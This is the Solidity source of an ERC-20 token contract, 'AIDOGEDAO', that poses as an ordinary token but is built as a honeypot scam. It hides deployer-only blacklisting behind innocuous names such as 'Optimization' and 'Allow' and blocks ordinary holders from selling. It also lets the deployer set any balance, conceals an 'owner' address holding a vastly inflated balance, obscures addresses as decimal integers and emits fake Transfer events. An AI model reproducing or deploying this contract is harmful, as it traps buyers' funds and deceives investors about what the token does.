/**
 *Submitted for verification at Arbiscan on 2023-04-23
*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;


interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract AIDOGEDAO  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}